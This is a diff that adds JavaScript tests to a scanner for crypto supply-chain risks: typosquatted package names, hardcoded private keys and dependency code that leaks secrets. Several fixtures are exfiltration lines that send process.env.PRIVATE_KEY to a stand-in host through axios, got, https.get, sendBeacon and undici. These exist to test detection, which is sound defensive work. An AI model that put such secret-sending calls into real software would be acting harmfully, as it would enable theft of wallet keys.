@@ -390,3 +390,102 @@ test("a declared lookalike with no node_modules in the repo is a Medium signer r
   assert.deepEqual(leads.filter((l) => l.check === "dependency-reaches-signer").map((l) => [l.package, l.impact]), [["ethres", "Medium"]]);
   assert.deepEqual(high(leads), []);
 });
+
+// Deep-review repair.
+
+const names = (deps) => cryptoLeads({ files: { "package.json": JSON.stringify({ dependencies: Object.fromEntries(deps.map((d) => [d, "1.0.0"])) }) } })
+  .filter((l) => l.check === "crypto-package-lookalike").map((l) => [l.package, l.resembles]);
+
+test("affix typosquats of a known package are lookalikes", () => {
+  const squats = ["ethers-js", "ethersjs", "ethers.js", "ethers-sdk", "web3.js", "web3-js", "viem-js", "viemjs", "viem-sdk", "js-ethers", "@solana/web3.js-sdk", "@solana/web3.js-lib"];
+  assert.deepEqual(names(squats).map(([n]) => n).sort(), [...squats].sort());
+  assert.deepEqual(names(["ethers-js", "web3.js", "viem-sdk"]), [["ethers-js", "ethers"], ["web3.js", "web3"], ["viem-sdk", "viem"]]);
+});
+
+test("the real packages and their families are not lookalikes", () => {
+  const real = ["ethers", "web3", "viem", "@solana/web3.js", "web3-utils", "web3-eth", "web3-core", "@ethersproject/wallet", "@ethersproject/providers", "ethereumjs-util", "@openzeppelin/contracts", "ethers-decode-error", "lodash", "express"];
+  assert.deepEqual(names(real), []);
+});
+
+test("a squatted affix name used as a signer is a suspect, and the real name is not", () => {
+  const use = (name) => cryptoLeads({ files: { "package.json": JSON.stringify({ dependencies: { [name]: "1" } }), "deploy.js": `const { Wallet } = require('${name}');\nnew Wallet(process.env.DEPLOYER_KEY);\n` } }).filter((l) => l.check === "dependency-reaches-signer").map((l) => [l.package, l.impact]);
+  assert.deepEqual(use("ethers-js"), [["ethers-js", "Medium"]]);
+  assert.deepEqual(use("ethers"), []);
+});
+
+test("exfil through axios, got, undici and sendBeacon is caught, like fetch", () => {
+  const body = (call) => `const k = process.env.PRIVATE_KEY;\n${call}\n`;
+  const sinks = ["axios.post('https://x.invalid', { k });", "axios({ url: 'https://x.invalid', data: k });", "got.post('https://x.invalid', { json: { k } });", "https.get('https://x.invalid/?k=' + k);", "navigator.sendBeacon('https://x.invalid', k);", "undici.request('https://x.invalid', { body: k });", "ky.post('https://x.invalid', { json: { k } });"];
+  for (const call of sinks) {
+    const hit = cryptoLeads({ files: { "node_modules/a/index.js": body(call) } }).filter((l) => l.check === "dependency-exfil-code");
+    assert.deepEqual(hit.map((l) => [l.impact, l.lines[0]]), [["High", 2]], call);
+  }
+  // Negative: the same sinks with no secret read, or a secret read far away, are clean.
+  assert.deepEqual(cryptoLeads({ files: { "node_modules/a/index.js": "axios.post('https://x.invalid', { ok: 1 });\n", "node_modules/b/index.js": `const k = process.env.PRIVATE_KEY;\n${"\n".repeat(30)}axios.post('https://x.invalid', { k });\n` } }), []);
+  // A word that only contains a client name is not a call.
+  assert.deepEqual(cryptoLeads({ files: { "node_modules/a/index.js": "const k = process.env.PRIVATE_KEY;\nmyaxios.postpone(k);\nforgot (k);\n" } }), []);
+});
+
+test("the semgrep rules catch an axios.post exfil of an env secret", async () => {
+  const snapshot = { files: { "node_modules/evil/index.js": "const axios = require('axios');\naxios.post('https://x.invalid', { key: process.env.PRIVATE_KEY });\n", "package.json": "{}" }, npmAdvisories: "" };
+  const r = await scanSnapshot(snapshot, "semgrep");
+  assert.equal(r.status, "ok");
+  assert.deepEqual(r.leads.map((l) => [l.check, l.file]), [["touchstone-env-secret-to-network", "node_modules/evil/index.js"]]);
+  const clean = await scanSnapshot({ files: { "node_modules/ok/index.js": "const axios = require('axios');\naxios.post('https://x.invalid', { ok: 1 });\n", "package.json": "{}" }, npmAdvisories: "" }, "semgrep");
+  assert.deepEqual(clean.leads, []);
+});
+
+test("a bytes32 role constant is not a private key, and a real key assignment is", () => {
+  const hex = "1".padStart(64, "0");
+  const role = [`bytes32 private constant DEPLOYER_ROLE = 0x${hex};`, `bytes32 public immutable DEPLOYER_KEY_HASH = 0x${hex};`, `bytes32 constant PRIVATE_KEY_ROLE = keccak256("x"); // 0x${hex}`, `bytes32 public constant DEPLOYER_ROLE = 0x${hex};`];
+  for (const line of role) assert.deepEqual(cryptoLeads({ files: { "contracts/Roles.sol": `${line}\n` } }), [], line);
+  const keys = { "a.js": `const privateKey = "0x${hex}";`, "b.env": `DEPLOYER_KEY=0x${hex}`, "c.json": `{ "private_key": "${hex}" }`, "d.js": `module.exports = { accounts: ["0x${hex}"] };`, "e.sol": `uint256 deployerPrivateKey = 0x${hex};`, "f.js": `accounts: [a, "0x${hex}"]` };
+  for (const [file, text] of Object.entries(keys)) assert.deepEqual(cryptoLeads({ files: { [file]: text } }).map((l) => l.check), ["evm-private-key"], file);
+  // The key word must come before the value. A hash that merely sits next to the word is not a key.
+  assert.deepEqual(cryptoLeads({ files: { "x.js": `const h = "0x${hex}"; // not a private key` } }), []);
+});
+
+test("ethers v6 signer idioms count as a signer: ethers.Wallet, Wallet.fromPhrase, Contract with a wallet", () => {
+  const reach = (code, extra = {}) => cryptoLeads({ files: { "package.json": JSON.stringify({ dependencies: { "ethers-js": "1" } }), "deploy.js": code, ...extra } }).filter((l) => l.check === "dependency-reaches-signer").length;
+  assert.equal(reach("import * as ethers from 'ethers-js';\nconst w = new ethers.Wallet(pk);\n"), 1);
+  assert.equal(reach("import { Wallet } from 'ethers-js';\nconst w = Wallet.fromPhrase(words);\n"), 1);
+  assert.equal(reach("import { Contract } from 'ethers-js';\nconst c = new Contract(addr, abi, wallet);\n"), 1);
+  assert.equal(reach("import * as ethers from 'ethers-js';\nconst c = new ethers.Contract(addr, abi, deployerSigner);\n"), 1);
+  // Negative: a read-only contract, or a provider, is not a signer.
+  assert.equal(reach("import * as ethers from 'ethers-js';\nconst c = new ethers.Contract(addr, abi, provider);\n"), 0);
+  assert.equal(reach("import { parseEther } from 'ethers-js';\nparseEther('1');\n"), 0);
+});
+
+// Re-review: the key check must keep real-key recall.
+
+test("a hardcoded key is caught after ||, ??, =>, return, + and in an object fallback", () => {
+  const hex = "2".padStart(64, "0");
+  const shapes = {
+    "or.js": `const pk = process.env.PRIVATE_KEY || "0x${hex}";`,
+    "nullish.js": `const privateKey = process.env.PK ?? '0x${hex}';`,
+    "object.js": `module.exports = { privateKey: process.env.KEY || "${hex}", };`,
+    "arrow.js": `const getPrivateKey = () => "0x${hex}";`,
+    "return.js": `function privateKey() { return "0x${hex}"; }`,
+    "concat.js": `const privateKey = "0x" + "${hex}";`,
+    "after-role.js": `const adminRole = "ADMIN_ROLE"; const privateKey = "0x${hex}";`,
+    "after-hash.js": `const id = keccak256("x"); const deployerKey = "0x${hex}";`,
+  };
+  for (const [file, text] of Object.entries(shapes)) assert.deepEqual(cryptoLeads({ files: { [file]: text } }).map((l) => l.check), ["evm-private-key"], file);
+  // Negative: the same statements are still skipped when the role or hash is in the key's own statement.
+  const skipped = [`bytes32 privateKey = 0x${hex};`, `bytes32 public constant DEPLOYER_ROLE = 0x${hex};`, `const x = keccak256("a"), privateKey = "0x${hex}";`, `const adminRole = "ADMIN_ROLE"; // 0x${hex}`];
+  for (const line of skipped) assert.deepEqual(cryptoLeads({ files: { "x.sol": line } }), [], line);
+});
+
+test("a key labeled only by a trailing comment is not flagged (documented limit)", () => {
+  const hex = "2".padStart(64, "0");
+  assert.deepEqual(cryptoLeads({ files: { "x.js": `const PK = "0x${hex}"; // deployer private key` } }), []);
+});
+
+test("semgrep does not flag an axios or got client config call that sends nothing", async () => {
+  const files = { "node_modules/ok/index.js": "const axios = require('axios');\nconst got = require('got');\nconst a = axios.create({ headers: { a: process.env.TOKEN } });\nconst g = got.extend({ prefixUrl: process.env.API_URL });\n", "package.json": "{}" };
+  const r = await scanSnapshot({ files, npmAdvisories: "" }, "semgrep");
+  assert.equal(r.status, "ok");
+  assert.deepEqual(r.leads, []);
+  const hit = await scanSnapshot({ files: { "node_modules/evil/index.js": "const got = require('got');\ngot.post('https://x.invalid', { json: { k: process.env.PRIVATE_KEY } });\n", "package.json": "{}" }, npmAdvisories: "" }, "semgrep");
+  assert.deepEqual(hit.leads.map((l) => l.check), ["touchstone-env-secret-to-network"]);
+});
